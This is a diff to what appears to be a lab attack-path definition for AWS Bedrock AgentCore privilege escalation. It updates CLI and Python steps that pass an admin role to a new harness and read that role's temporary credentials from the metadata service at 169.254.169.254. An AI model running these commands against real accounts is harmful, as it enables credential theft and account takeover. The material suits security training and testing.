@@ -79,9 +79,11 @@ attackMap:
         The iam:PassRole permission authorizes handing the privileged role to the new Harness.
         CreateHarness internally calls CreateAgentRuntime, CreateAgentRuntimeEndpoint, and
         CreateWorkloadIdentity to fully provision the underlying Runtime; all three permissions
-        must be present in the attacker's policy set for the API call to succeed. The response
-        includes the underlying agentRuntimeId. The attacker then polls GetAgentRuntime with
-        that runtime ID until the status reaches READY -- typically 1-3 minutes.
+        must be present in the attacker's policy set for the API call to succeed. Memory is
+        disabled on the call because the attack never uses the managed agent loop. The response
+        nests the new harness under a harness key carrying its arn and harnessId. The attacker
+        then polls GetHarness with that harness ID until the status reaches READY -- typically
+        1-3 minutes.
       commands:
         - description: "Get account ID and build the target role ARN"
           command: |
@@ -91,35 +93,36 @@ attackMap:
           command: |
             HARNESS_RESPONSE=$(aws bedrock-agentcore-control create-harness \
               --region us-east-1 \
-              --name bedrock-005-privesc-harness \
+              --harness-name bedrock-005-privesc-harness \
               --execution-role-arn "$TARGET_ROLE_ARN" \
-              --model-id "amazon.nova-lite-v1:0")
-            HARNESS_ID=$(echo "$HARNESS_RESPONSE" | jq -r '.harnessId')
-            RUNTIME_ID=$(echo "$HARNESS_RESPONSE" | jq -r '.agentRuntimeId')
+              --model '{"bedrockModelConfig":{"modelId":"amazon.nova-micro-v1:0"}}' \
+              --memory '{"disabled":{}}')
+            HARNESS_ARN=$(echo "$HARNESS_RESPONSE" | jq -r '.harness.arn')
+            HARNESS_ID=$(echo "$HARNESS_RESPONSE" | jq -r '.harness.harnessId')
+            echo "Harness ARN: $HARNESS_ARN"
             echo "Harness ID: $HARNESS_ID"
-            echo "Runtime ID: $RUNTIME_ID"
-        - description: "Poll until the underlying Runtime reaches READY state"
+        - description: "Poll until the Harness reaches READY state"
           command: |
             while true; do
-              STATUS=$(aws bedrock-agentcore-control get-agent-runtime \
+              STATUS=$(aws bedrock-agentcore-control get-harness \
                 --region us-east-1 \
-                --agent-runtime-id "$RUNTIME_ID" \
-                --query 'status' --output text)
+                --harness-id "$HARNESS_ID" \
+                --query 'harness.status' --output text)
               echo "Status: $STATUS"
               [ "$STATUS" = "READY" ] && break
               sleep 15
             done
       hints:
         - "CreateHarness is the Harness-specific equivalent of CreateAgentRuntime -- it wires a foundation model and managed agent layer on top of an underlying Runtime. You do not need a container image; specify a model ID instead. The executionRoleArn is the key field that makes this a privilege escalation."
-        - "After CreateHarness returns, extract the agentRuntimeId from the response and poll GetAgentRuntime until status reaches READY before calling InvokeAgentRuntimeCommand. Initialization typically takes 1-3 minutes."
+        - "After CreateHarness returns, extract .harness.arn and .harness.harnessId from the response and poll GetHarness until status reaches READY before calling InvokeAgentRuntimeCommand. Initialization typically takes 1-3 minutes."
         - "Browse to https://pathfinding.cloud/paths/bedrock-005 for technique details."
 
     - from: agentcore-harness
       to: target-role
       label: "bedrock-agentcore:InvokeAgentRuntimeCommand"
       description: >
-        With the underlying Runtime in READY state, the attacker calls InvokeAgentRuntimeCommand
-        using the Runtime ID (not the Harness ID) with a bash command that reads temporary
+        With the Harness in READY state, the attacker calls InvokeAgentRuntimeCommand with the
+        harness ARN as the agentRuntimeArn and a bash command that reads temporary
         credentials from MMDS. The command requests an IMDSv2 token, then uses it to fetch
         the execution role name from the MMDS security-credentials path, and finally retrieves
         the full credential JSON (AccessKeyId, SecretAccessKey, Token) for the target admin
@@ -129,12 +132,27 @@ attackMap:
       commands:
         - description: "Invoke a shell command to read MMDS credentials from the Harness MicroVM"
           command: |
-            CREDS=$(aws bedrock-agentcore invoke-agent-runtime-command \
-              --region us-east-1 \
-              --agent-runtime-id "$RUNTIME_ID" \
-              --command 'TOKEN=$(curl -sX PUT http://169.254.169.254/latest/api/token -H "X-aws-ec2-metadata-token-ttl-seconds: 60"); ROLE=$(curl -s -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/); curl -s -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE' \
-              --query 'output' \
-              --output text)
+            cat > read_mmds.py <<'EOF'
+            import boto3, sys, uuid
+
+            BASH_COMMAND = """bash -c '
+            TOKEN=$(curl -sX PUT http://169.254.169.254/latest/api/token -H "X-aws-ec2-metadata-token-ttl-seconds: 60")
+            ROLE=$(curl -s -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/)
+            curl -s -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE
+            '"""
+
+            client = boto3.client("bedrock-agentcore", region_name="us-east-1")
+            response = client.invoke_agent_runtime_command(
+                agentRuntimeArn=sys.argv[1],
+                runtimeSessionId=str(uuid.uuid4()),
+                body={"command": BASH_COMMAND, "timeout": 30},
+            )
+            for event in response["stream"]:
+                chunk = event.get("chunk", {})
+                if "contentDelta" in chunk and "stdout" in chunk["contentDelta"]:
+                    print(chunk["contentDelta"]["stdout"], end="")
+            EOF
+            CREDS=$(python3 read_mmds.py "$HARNESS_ARN")
             echo "$CREDS"
         - description: "Export the extracted credentials"
           command: |
